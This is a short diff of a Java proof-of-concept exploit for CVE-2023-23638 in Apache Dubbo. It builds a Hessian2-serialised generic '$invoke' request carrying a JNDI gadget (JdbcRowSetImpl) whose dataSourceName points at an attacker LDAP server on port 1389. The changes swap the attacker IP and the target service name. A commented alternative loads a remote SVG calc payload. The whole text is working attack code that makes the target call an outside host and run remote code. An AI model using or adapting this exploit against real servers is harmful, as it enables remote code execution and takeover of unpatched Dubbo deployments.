@@ -43,7 +43,7 @@ public class CVE_2023_23638_2 {
         Hessian2ObjectOutput hessian2ObjectOutput = new Hessian2ObjectOutput(baos);
         hessian2ObjectOutput.writeUTF("2.7.6");
         //todo 此处填写Dubbo提供的服务名
-        hessian2ObjectOutput.writeUTF("com.example.api.DemoService");
+        hessian2ObjectOutput.writeUTF("com.pacemrc.dubbo.api.DemoService");
         hessian2ObjectOutput.writeUTF("");
         hessian2ObjectOutput.writeUTF("$invoke");
         hessian2ObjectOutput.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
@@ -51,7 +51,7 @@ public class CVE_2023_23638_2 {
         hessian2ObjectOutput.writeUTF("sayHello");
         hessian2ObjectOutput.writeObject(new String[] {"java.lang.String"});
 
-//        getRawReturnPayload2(hessian2ObjectOutput, "ldap://192.168.26.160:1389/pjppmx");
+//        getRawReturnPayload2(hessian2ObjectOutput, "ldap://10.58.120.200:1389/nco5cx");
         getRawReturnPayload1(hessian2ObjectOutput, "http://127.0.0.1:8000/svg1_calc.svg");
 
 
@@ -98,7 +98,7 @@ public class CVE_2023_23638_2 {
         HashMap jndi = new HashMap();
 
         jndi.put("class", "com.sun.rowset.JdbcRowSetImpl");
-        jndi.put("dataSourceName", "ldap://192.168.26.160:1389/rjoxgg");
+        jndi.put("dataSourceName", "ldap://10.58.120.200:1389/nco5cx");
         jndi.put("autoCommit", "true");
 
         List<HashMap> list = new ArrayList<>();
